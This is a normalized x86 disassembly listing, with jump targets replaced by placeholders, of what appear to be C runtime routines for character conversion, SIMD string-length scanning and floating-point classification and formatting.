add esp 0x14
mov esp ebp
pop ebp
retn
sub_433e4c
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push 0x0
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433e78
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push 0x0
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433ea4
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push 0x0
call sub_42d5a6
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433ed0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push 0x0
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433efc
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433902
add esp 0xc
push 0x0
call sub_42deb3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433f28
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push 0x0
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433f54
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push 0x0
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433f80
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push 0x0
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433fac
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push 0x0
call sub_42d7ce
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433fd8
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push 0x0
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434004
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_43391d
add esp 0xc
push 0x0
call sub_42e159
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434030
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
mov eax [ ebp - 0xc ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
movzx eax [ esi ]
push eax
call sub_43ef62
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
inc edi
push edi
push esi
push 0x9
push [ eax + 0x8 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0xc ]
cmp [ edi + 0x4 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_430f56
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x4 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x4 ]
push esi
push 0x9
push [ edi + 0x8 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0xc ]
test eax eax
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ edi + 0x4 ]
jmp r-xdata
sub_434144
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_41cbf0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push eax
call sub_434197
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x14 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_434197
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x14 ]
call sub_41cbf0
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
push [ eax + 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_430f56
push 0x2a
pop esi
mov [ eax ] esi
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x14 ]
and [ ecx + 0x350 ] 0xfffffffd
call sub_430f56
push 0x22
pop esi
mov [ eax ] esi
call sub_430e30
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_40dea0
add esp 0xc
push edi
push esi
push ebx
call sub_40dea0
add esp 0xc
sub_4342b8
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0xc ]
call sub_439234
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_434197
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_434309
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0x1f
push 0x20
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax ecx
mov edx [ ebp + 0xc ]
add edx ecx
cmp ecx edx
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0xf
push 0x10
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub eax ecx
cmp [ eax ] 0x0
je r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc eax
cmp eax edx
jne r-xdata
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov eax ecx
jmp r-xdata
mov edi eax
add ecx esi
sub edi edx
mov eax edi
and eax 0x1f
sub edi eax
vxorps ymm1 ymm1 ymm1
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
mov edi eax
add ecx esi
sub edi edx
pxor xmm1 xmm1
mov eax edi
and eax 0xf
sub edi eax
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
cmp ecx edi
jne r-xdata
cmp ecx edi
jne r-xdata
vpcmpeqb ymm0 ymm1 [ ecx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
movaps xmm0 [ ecx ]
pcmpeqb xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
add ecx 0x20
cmp ecx eax
jne r-xdata
add ecx 0x10
cmp ecx eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
vzeroupper
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
jmp r-xdata
inc ecx
inc ecx
sub_43442f
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
test cl 0x1
je r-xdata
mov eax [ ebp + 0xc ]
lea edx [ ecx + eax * 2 ]
mov eax ecx
cmp ecx edx
je r-xdata
test cl 0x1
je r-xdata
mov esi ecx
and esi 0x1f
push 0x20
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
sub eax ecx
sar eax 0x1
xor edi edi
mov esi ecx
and esi 0xf
push 0x10
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
sub edx ecx
xor edi edi
add eax 0x2
cmp eax edx
jne r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
xor edi edi
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
mov eax edx
jmp r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
cmp [ eax ] di
je r-xdata
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
lea edx [ ecx + edx * 2 ]
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0x1f
sub ecx eax
vxorps ymm1 ymm1 ymm1
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ edx ] di
je r-xdata
lea edx [ ecx + edx * 2 ]
pxor xmm1 xmm1
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0xf
sub ecx eax
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
cmp [ edx ] di
je r-xdata
jmp r-xdata
cmp edx ecx
jne r-xdata
cmp edx ecx
jne r-xdata
vpcmpeqw ymm0 ymm1 [ edx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
movaps xmm0 [ edx ]
pcmpeqw xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
add edx 0x20
cmp edx ecx
jne r-xdata
add edx 0x10
cmp edx ecx
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
sar edx 0x1
vzeroupper
cmp [ edx ] di
je r-xdata
sub edx eax
jmp r-xdata
add edx 0x2
add edx 0x2
sar edx 0x1
jmp r-xdata
sub_4345e1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
mov edx [ ebp + 0xc ]
add edx ecx
cmp ecx edx
je r-xdata
sub eax ecx
pop ebp
retn
cmp [ eax ] 0x0
je r-xdata
inc eax
cmp eax edx
jne r-xdata
sub_434602
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ecx + eax * 2 ]
mov eax ecx
cmp ecx edx
je r-xdata
sub eax ecx
sar eax 0x1
pop ebp
retn
cmp [ eax ] 0x0
je r-xdata
add eax 0x2
cmp eax edx
jne r-xdata
sub_434629
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov edx esi
push edi
mov edi [ ebp + 0xc ]
and edx 0x1f
push 0x20
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
cmp edi edx
jae r-xdata
lea ecx [ edx + esi ]
mov eax esi
cmp esi ecx
je r-xdata
mov edx edi
sub eax esi
cmp eax edx
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
sub edi edx
lea ecx [ eax + esi ]
mov eax edi
and eax 0x1f
sub edi eax
vxorps ymm1 ymm1 ymm1
add edi ecx
jmp r-xdata
inc eax
cmp eax ecx
jne r-xdata
cmp ecx edi
jne r-xdata
vpcmpeqb ymm0 ymm1 [ ecx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
add ecx 0x20
cmp ecx eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
vzeroupper
mov eax ecx
inc ecx
sub_4346a8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push edi
test cl 0x1
je r-xdata
push esi
mov esi ecx
and esi 0x1f
push 0x20
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
lea edx [ ecx + eax * 2 ]
mov eax ecx
cmp ecx edx
je r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov eax ecx
cmp ecx edx
je r-xdata
mov esi eax
sub eax ecx
sar eax 0x1
jmp r-xdata
xor edi edi
sub eax ecx
sar eax 0x1
cmp eax esi
jne r-xdata
cmp [ eax ] di
je r-xdata
pop edi
pop ebp
retn
add eax 0x2
cmp eax edx
jne r-xdata
pop esi
lea edx [ ecx + eax * 2 ]
mov ecx [ ebp + 0xc ]
sub ecx esi
mov eax ecx
and eax 0x1f
sub ecx eax
vxorps ymm1 ymm1 ymm1
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add eax 0x2
cmp eax edx
jne r-xdata
cmp [ eax ] di
je r-xdata
cmp edx ecx
jne r-xdata
vpcmpeqw ymm0 ymm1 [ edx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
add edx 0x20
cmp edx ecx
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
sar edx 0x1
vzeroupper
mov eax edx
add edx 0x2
sub_434763
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov edx esi
push edi
mov edi [ ebp + 0xc ]
and edx 0xf
push 0x10
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
cmp edi edx
jae r-xdata
lea ecx [ edx + esi ]
mov eax esi
cmp esi ecx
je r-xdata
mov edx edi
sub eax esi
cmp eax edx
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
sub edi edx
lea ecx [ eax + esi ]
mov eax edi
pxor xmm1 xmm1
and eax 0xf
sub edi eax
add edi ecx
jmp r-xdata
inc eax
cmp eax ecx
jne r-xdata
cmp ecx edi
jne r-xdata
movaps xmm0 xmm1
pcmpeqb xmm0 [ ecx ]
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
add ecx 0x10
cmp ecx eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
mov eax ecx
inc ecx
sub_4347e2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push edi
test cl 0x1
je r-xdata
push esi
mov esi ecx
and esi 0xf
push 0x10
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
lea edx [ ecx + eax * 2 ]
mov eax ecx
cmp ecx edx
je r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov eax ecx
cmp ecx edx
je r-xdata
mov esi eax
sub eax ecx
sar eax 0x1
jmp r-xdata
xor edi edi
sub eax ecx
sar eax 0x1
cmp eax esi
jne r-xdata
cmp [ eax ] di
je r-xdata
pop edi
pop ebp
retn
add eax 0x2
cmp eax edx
jne r-xdata
pop esi
lea edx [ ecx + eax * 2 ]
pxor xmm1 xmm1
mov ecx [ ebp + 0xc ]
sub ecx esi
mov eax ecx
and eax 0xf
sub ecx eax
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add eax 0x2
cmp eax edx
jne r-xdata
cmp [ eax ] di
je r-xdata
cmp edx ecx
jne r-xdata
movaps xmm0 xmm1
pcmpeqw xmm0 [ edx ]
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
add edx 0x10
cmp edx ecx
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
sar edx 0x1
mov eax edx
add edx 0x2
sub_4348ca
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0x1f
push 0x20
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
mov edx [ ebp + 0x8 ]
mov ecx edx
mov eax [ ebp + 0xc ]
add eax edx
cmp edx eax
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0xf
push 0x10
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub ecx edx
cmp [ ecx ] 0x0
je r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc ecx
cmp ecx eax
jne r-xdata
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop edi
mov eax ecx
pop esi
pop ebp
retn
mov edi eax
add ecx esi
sub edi edx
mov eax edi
and eax 0x1f
sub edi eax
vxorps ymm1 ymm1 ymm1
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
mov edi eax
add ecx esi
sub edi edx
pxor xmm1 xmm1
mov eax edi
and eax 0xf
sub edi eax
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
cmp ecx edi
jne r-xdata
cmp ecx edi
jne r-xdata
vpcmpeqb ymm0 ymm1 [ ecx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
movaps xmm0 [ ecx ]
pcmpeqb xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
add ecx 0x20
cmp ecx eax
jne r-xdata
add ecx 0x10
cmp ecx eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
vzeroupper
jmp r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
jmp r-xdata
inc ecx
inc ecx
sub_4349f1
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
test cl 0x1
je r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
test cl 0x1
je r-xdata
mov esi ecx
and esi 0x1f
push 0x20
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
sub edx ecx
xor edi edi
mov esi ecx
and esi 0xf
push 0x10
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
xor edi edi
add edx 0x2
cmp edx eax
jne r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
xor edi edi
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
pop edi
mov eax edx
pop esi
mov esp ebp
pop ebp
retn
lea edx [ ecx + edx * 2 ]
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0x1f
sub ecx eax
vxorps ymm1 ymm1 ymm1
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
cmp [ edx ] di
je r-xdata
jmp r-xdata
lea edx [ ecx + edx * 2 ]
pxor xmm1 xmm1
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0xf
sub ecx eax
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
cmp [ edx ] di
je r-xdata
jmp r-xdata
cmp edx ecx
jne r-xdata
cmp edx ecx
jne r-xdata
vpcmpeqw ymm0 ymm1 [ edx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
movaps xmm0 [ edx ]
pcmpeqw xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
add edx 0x20
cmp edx ecx
jne r-xdata
add edx 0x10
cmp edx ecx
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
sar edx 0x1
vzeroupper
jmp r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
jmp r-xdata
add edx 0x2
add edx 0x2
sar edx 0x1
sub_434ba8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x350 ] eax
jne r-xdata
call sub_43a88a
mov [ esi ] eax
sub_434bd5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x350 ] eax
jne r-xdata
call sub_437a95
mov [ esi ] eax
sub_434c02
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x7ff
push ebx
push esi
xor edx edx
mov ebx [ eax ]
mov esi [ eax + 0x4 ]
mov eax esi
shr eax 0x14
and eax ecx
push edi
cmp eax ecx
jne r-xdata
xor eax eax
cmp edx edx
jne r-xdata
mov edi esi
mov eax ebx
and edi 0xfffff
or eax edi
jne r-xdata
mov ecx esi
mov eax edx
and ecx 0x80000000
or eax ecx
mov eax 0x80000
je r-xdata
inc eax
jmp r-xdata
and esi eax
or edx esi
je r-xdata
cmp ebx edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x3
jmp r-xdata
push 0x2
jmp r-xdata
cmp edi eax
jne r-xdata
pop eax
jmp r-xdata
push 0x4
sub_434c6e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov ecx [ eax + 0x4 ]
mov eax edx
and ecx 0x80000000
or eax ecx
je r-xdata
mov al dl
pop ebp
retn
inc edx
sub_434c8c
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
mov edi [ ebp + 0x1c ]
xor ebx ebx
test edi edi
jns r-xdata
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
push [ ebp + 0x28 ]
mov [ esi ] bl
call sub_41cbf0
lea eax [ edi + 0xb ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi ebx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov eax ecx
shr eax 0x14
and eax 0x7ff
cmp eax 0x7ff
jne r-xdata
call sub_430f56
push 0x22
pop edi
mov [ eax ] edi
call sub_430e30
jmp r-xdata
and ecx 0x80000000
mov eax ebx
or eax ecx
je r-xdata
cmp ebx ebx
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ecx [ edx + 0x4 ]
xor ebx ebx
cmp [ ebp + 0x20 ] bl
push 0x30
sete bl
mov [ ebp - 0xc ] 0x3ff
dec ebx
xor eax eax
and ebx 0xffffffe0
and ecx 0x7ff00000
add ebx 0x27
or eax ecx
mov [ ebp - 0x1c ] ebx
pop eax
jne r-xdata
mov [ esi ] 0x2d
inc esi
push ebx
push [ ebp + 0x24 ]
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
push edx
call sub_434f8f
mov edi eax
add esp 0x24
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x30 ]
and [ ecx + 0x350 ] 0xfffffffd
mov [ esi ] 0x31
inc esi
mov [ esi ] al
inc esi
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
and eax 0xfffff
or ecx eax
jne r-xdata
push 0x65
push esi
call sub_44bf10
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] bl
jmp r-xdata
